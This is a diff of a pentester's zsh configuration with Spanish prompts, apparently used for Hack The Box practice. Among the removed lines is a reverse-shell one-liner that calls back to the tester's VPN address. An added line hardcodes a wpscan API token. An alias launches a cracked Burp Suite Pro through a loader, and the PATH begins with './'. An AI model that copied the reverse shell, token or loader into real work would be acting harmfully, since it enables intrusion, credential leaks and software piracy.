@@ -28,12 +28,13 @@ fi
  
  
 # Export PATH$
-export PATH=/home/kermit/.local/bin:/usr/share/responder:/usr/share/ghidra:/usr/share/hydra:/usr/share/libreoffice:/snap/bin:/usr/sandbox:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:/root/.local/bin:/home/kermit/scripts/bash:/home/kermit/scripts/python:PATH
+export PATH=./:/home/kermit/.local/bin:/usr/bin/:/usr/share/responder:/usr/share/ghidra:/usr/share/hydra:/usr/share/libreoffice:/snap/bin:/usr/sandbox:/usr/local/bin:/usr/local/go/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/bin:/usr/local/games:/usr/games:/home/kermit/.fzf/bin:/opt/exploitdb:/root/.local/bin:/home/kermit/scripts/bash:/home/kermit/scripts/python:/usr/share/metasploit-framework/tools/exploit:/usr/bin/arsenal:/usr/bin/gtfo/:/home/kermit/.fzf/bin/:/usr/share/Wordpresscan/:PATH
  
 # Add as ~/.zshrc
 export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
 export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
 export _JAVA_AWT_WM_NONREPARENTING=1
+export wpscan="3Iu1JsIszEyHy2ZJZwVvulOzdiysm0uhVYNpi4oqakc"
 #export http_proxy=127.0.0.1:8080
 #export https_proxy=127.0.0.1:8080
  
@@ -71,7 +72,7 @@ function unpin()
 }
 function procnet()
 {
-  echo; for port in $(cat $1 | awk '{print $2}' | grep -v "local" | awk '{print $2}' FS=":" | sort -u); do echo "${yellow}[+]${endcolor} Port $port -> ${red} $((0x$port))\n" ${endcolor}; done | sort -n; echo
+  echo; for port in $(cat $1 | awk '{print $2}' | grep -v "local" | awk '{print $2}' FS=":" | sort -u); do echo -ne "\t${yellow}[+]${endcolor} Port $port -> ${red} $((0x$port))\n" ${endcolor}; done | sort -n; echo
 }
 # alias
 alias burpro="java --illegal-access=permit -Dfile.encoding=utf-8 -javaagent:/home/kermit/Desktop/Burp-Suite/loader.jar -noverify -jar /home/kermit/Desktop/Burp-Suite/Burp_Suite_Pro.jar &"
@@ -304,101 +305,157 @@ function rmk(){
 }
 
 function helpPanel(){
-echo -ne "\n\t${red}[!]${endcolor} Es necesario especificar ambos parametros"
-echo -ne "\n\n\t\t${blue}[+]${endcolor} Parametro ${red}-i${endcolor} especifica la ip"
-echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-n${endcolor} especifica el nombre"
-tput cnorm;
+  echo -ne "\n\t${red}[!]${endcolor} Es necesario especificar ambos parametros"
+  echo -ne "\n\n\t\t${blue}[+]${endcolor} Parametro ${red}-i${endcolor} especifica la ip"
+  echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-n${endcolor} especifica el nombre\n"
+  tput cnorm; echo
  
 }
+
+function helpTarget(){
+  echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-i${endcolor} especifica la ip\n"
+  echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-n${endcolor} especifica el nombre\n"
+  echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-s${endcolor} especifica el sistema windows/linux\n"
+  tput cnorm; echo
+ 
+}
+
+function helpMKT(){
+  echo -ne "\n\t\t${blue}[+]${endcolor} Parametro ${red}-n${endcolor} especifica el nombre\n"
+  tput cnorm; echo
+ 
+}
+
+function target(){
+
+
+  tput civis
+  declare -i counter=0; while getopts "i:n:s:h:" arg; do
+    case $arg in
+      i) ip_address=$OPTARG; let counter+=1;;
+      n) nombre_maquina=$OPTARG; let counter+=1;;
+      s) sistema=$OPTARG; let counter+=1;;
+      h) helpTarget;;
+    esac
+  done
+
+  if [ $counter -ne 3 ]; then
+    helpTarget
+  else
+    echo -ne "$ip_address" > /home/kermit/.config/bin/target.txt
+    echo -ne "$nombre_maquina" > /home/kermit/.config/bin/target_sys.txt
+    echo -ne "$sistema" > /home/kermit/.config/bin/ttl.txt
+    export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
+    export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
+    echo -ne "\n\t${blue}[+]${endcolor} Name: ${red}$nombre_maquina${endcolor}\n" 
+    echo -ne "\n\t${blue}[+]${endcolor} Ip: ${red}$ip_address${endcolor}\n"
+    echo -ne "\n\t${blue}[+]${endcolor} System: ${red}$sistema${endcolor}\n"
+    tput cnorm; echo
+  fi
+}
+
+function mkt(){
+  
+  tput civis
+  declare -i counter=0; while getopts "n:h:" arg; do
+    case $arg in
+      n) nombre_maquina=$OPTARG; let counter+=1;;
+      h) helpMKT;;
+    esac
+  done
+
+  if [ $counter -ne 1 ]; then
+    helpMKT
+  else
+    echo -e "\n\t${blue}[+]${endcolor} Creando directorios de trabajo...\n"
+    mkdir /home/kermit/maquinas/$nombre_maquina
+    mkdir /home/kermit/maquinas/$nombre_maquina/exploits
+    mkdir /home/kermit/maquinas/$nombre_maquina/content
+    touch /home/kermit/maquinas/$nombre_maquina/cred.txt
+    touch /home/kermit/maquinas/$nombre_maquina/index.html
+    chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
+    cd /home/kermit/maquinas/$nombre_maquina
+    tput cnorm; echo -ne "\n"; echo
+  fi
+}
+
+
 function scope(){
  
-tput civis
-declare -i counter=0; while getopts "i:n:h:" arg; do
+  tput civis
+  declare -i counter=0; while getopts "i:n:h:" arg; do
     case $arg in
       i) ip_address=$OPTARG; let counter+=1;;
       n) nombre_maquina=$OPTARG; let counter+=1;;
       h) helpPanel;;
     esac
-done
+  done
  
-if [ $counter -eq 0 ]; then
-  helpPanel
-else
-  echo -ne "\n\n\t${yellow}[?]${endcolor} Confirmando conexion VPN..."
-  IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')
-fi
-if [ "$IFACE" = "tun0" ]; then
-  htb_ip=$(/usr/sbin/ifconfig | grep tun0 -A1 | grep inet | awk '{print $2}')
-  echo -ne "\n\n\t${blue}[+]${endcolor} Conexion con VPN establecida"
-  echo -ne "\n\n\t${blue}[+]${endcolor} Ip de Hack the box: ${blue}$(/usr/sbin/ifconfig tun0 | grep "inet " | awk '{print $2}')${endcolor}"
-  ttl="$(ping -c 1 $ip_address | grep ttl | tr '=' ' ' | awk '{print $8}')"
-  if [ $? = "1" ]; then
-    echo -e "\n\n\t${red}[!]${endcolor} Host ${red}$nombre_maquina${endcolor} inactivo"
-    tput cnorm; exit 1
+  if [ $counter -ne 2 ]; then
+    helpPanel
   else
-    echo -e "\n\n\t${blue}[+]${endcolor} Host ${red}$nombre_maquina${endcolor} activo"
+    echo -ne "\n\n\t${yellow}[?]${endcolor} Confirmando conexion VPN..."
+    IFACE=$(/usr/sbin/ifconfig | grep tun0 | awk '{print $1}' | tr -d ':')
+    
+    if [ "$IFACE" = "tun0" ]; then
+      htb_ip=$(/usr/sbin/ifconfig | grep tun0 -A1 | grep inet | awk '{print $2}')
+      echo -ne "\n\n\t${blue}[+]${endcolor} Conexion con VPN establecida"
+      echo -ne "\n\n\t${blue}[+]${endcolor} Ip VPN: ${blue}$(/usr/sbin/ifconfig tun0 | grep "inet " | awk '{print $2}')${endcolor}"
+    else
+      echo "\n\n\t${red}[!]${endcolor} Error al crear index.html, ip de interfaz tun0 no disponible"
+    fi
+
+    ttl="$(ping -c 1 $ip_address | grep ttl | tr '=' ' ' | awk '{print $8}')"
+    if [ $? = "1" ]; then
+      echo -e "\n\t${red}[!]${endcolor} Host ${red}$nombre_maquina${endcolor} inactivo"
+      tput cnorm; exit 1
+    else
+      echo -e "\n\t${blue}[+]${endcolor} Host ${red}$nombre_maquina${endcolor} activo"
+    fi
+ 
+    echo -e "$nombre_maquina" > /home/kermit/.config/bin/target_sys.txt
+ 
+    if [[ $ttl -le 64 ]]; then
+      echo -e "\n\t${blue}[+]${endcolor} Sistema ${red}Linux  ${endcolor}"
+      echo -e "linux" > /home/kermit/.config/bin/ttl.txt
+    fi
+    if [[ $ttl -le 128 && $ttl -gt 64 ]]; then
+      echo -e "\n\t${blue}[+]${end} Sistema ${red}Windows  ${endcolor}"
+      echo -e "windows" > /home/kermit/.config/bin/ttl.txt
+    fi
+    echo -ne "\n\t${blue}[+]${endcolor} Ip target: ${red}$ip_address ${endcolor}"
+ 
+    echo "$ip_address" > /home/kermit/.config/bin/target.txt
+    echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt
+ 
+    echo -ne "\n$ip_address\t$nombre_maquina.htb\n\n" >> /etc/hosts
+    echo -e "\n\n\t${blue}[+]${endcolor} Añadido ${red}$nombre_maquina${endcolor} -> ${red}$ip_address${endcolor} al /etc/hosts..."
+ 
+    echo -e "\n\t${blue}[+]${endcolor} Creando directorios de trabajo...\n"
+    mkdir /home/kermit/maquinas/$nombre_maquina
+    mkdir /home/kermit/maquinas/$nombre_maquina/exploits
+    mkdir /home/kermit/maquinas/$nombre_maquina/recon
+    touch /home/kermit/maquinas/$nombre_maquina/cred.txt
+    touch /home/kermit/maquinas/$nombre_maquina/index.html
+    chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
+    cd /home/kermit/maquinas/$nombre_maquina
+    echo "\n"
+    export ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt)
+    export name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt)
+    chown -R kermit:kermit /home/kermit/maquinas/
+    tput cnorm
   fi
- 
-  echo -e "$nombre_maquina" > /home/kermit/.config/bin/target_sys.txt
- 
-  if [[ $ttl -le 64 ]]; then
-    echo -e "\n\t${blue}[+]${endcolor} Sistema ${red}Linux  ${endcolor}"
-    echo -e "linux" > /home/kermit/.config/bin/ttl.txt
-  fi
-  if [[ $ttl -le 128 && $ttl -gt 64 ]]; then
-    echo -e "\n\t${blue}[+]${end} Sistema ${red}Windows  ${endcolor}"
-    echo -e "windows" > /home/kermit/.config/bin/ttl.txt
-  fi
-  echo -ne "\n\t${blue}[+]${endcolor} Ip target: ${red}$ip_address ${endcolor}"
- 
-  echo "$ip_address" > /home/kermit/.config/bin/target.txt
-  echo "$nombre_maquina" > /home/kermit/.config/bin/name.txt
- 
-  echo "# Host addresses" > /etc/hosts
-  echo "#" >> /etc/hosts
-  echo "127.0.0.1  localhost" >> /etc/hosts
-  echo "127.0.1.1  parrot" >> /etc/hosts
-  echo -ne "\n$ip_address\t$nombre_maquina.htb\n\n" >> /etc/hosts
-  echo "::1        localhost ip6-localhost ip6-loopback" >> /etc/hosts
-  echo "ff02::1    ip6-allnodes" >> /etc/hosts
-  echo "ff02::2    ip6-allrouters" >> /etc/hosts
-  echo -e "\n\n\t${blue}[+]${endcolor} Añadido ${red}$nombre_maquina${endcolor} -> ${red}$ip_address${endcolor} al /etc/hosts..."
- 
- 
-  echo -e "\n\t${blue}[+]${endcolor} Creando directorios de trabajo...\n"
-  mkdir /home/kermit/maquinas/$nombre_maquina
-  mkdir /home/kermit/maquinas/$nombre_maquina/content
-  mkdir /home/kermit/maquinas/$nombre_maquina/recon
-  touch /home/kermit/maquinas/$nombre_maquina/nmap.txt
-  touch /home/kermit/maquinas/$nombre_maquina/cred.txt
-  touch /home/kermit/maquinas/$nombre_maquina/index.html
-  chmod o+x /home/kermit/maquinas/$nombre_maquina/index.html
-  echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/$htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
-  alias mach='cd /home/kermit/maquinas/$nombre_maquina'
-  cd /home/kermit/maquinas/$nombre_maquina
-  echo "\n"
-  lsd -la
-  echo "\n"
-  tput cnorm
-else
-  echo "\n\n\t${red}[!]${endcolor} Error al crear index.html, ip de interfaz tun0 no disponible"
-  echo -ne "#!/bin/bash \n\n bash -i >& /dev/tcp/htb_ip/443 0>&1" > /home/kermit/maquinas/$nombre_maquina/index.html
-  echo -ne "\n\n";
-  ip=$(/usr/bin/cat /home/kermit/.config/bin/target.txt);
-  name=$(/usr/bin/cat /home/kermit/.config/bin/name.txt);
-  tput cnorm
-fi
 }
 # funcion iiixgxgstrackckcttt porrrtttsss
 function ports(){
-    ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
-    ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
-    echo -e "\n${red}[*]${endcolor} ${green}Extracting information...${endcolor}\n" > extractPorts.tmp
-    echo -e "\t${red}[*]${endcolor} ${green}IP Address:${endcolor} $ip_address"  >> extractPorts.tmp
-    echo -e "\t${red}[*]${endcolor} ${green}Open ports:${endcolor} $ports\n"  >> extractPorts.tmp
-    echo $ports | tr -d '\n' | xclip -sel clip
-    echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
-    /usr/bin/bat extractPorts.tmp; /usr/bin/rm extractPorts.tmp
+  ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
+  ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
+  echo -e "\n${red}[*]${endcolor} ${green}Extracting information...${endcolor}\n" > extractPorts.tmp
+  echo -e "\t${red}[*]${endcolor} ${green}IP Address:${endcolor} $ip_address"  >> extractPorts.tmp
+  echo -e "\t${red}[*]${endcolor} ${green}Open ports:${endcolor} $ports\n"  >> extractPorts.tmp
+  echo $ports | tr -d '\n' | xclip -sel clip
+  echo -e "[*] Ports copied to clipboard\n"  >> extractPorts.tmp
+  /usr/bin/bat extractPorts.tmp; /usr/bin/rm extractPorts.tmp
 }
 #Funcion para cerrar sesion
 function finish(){
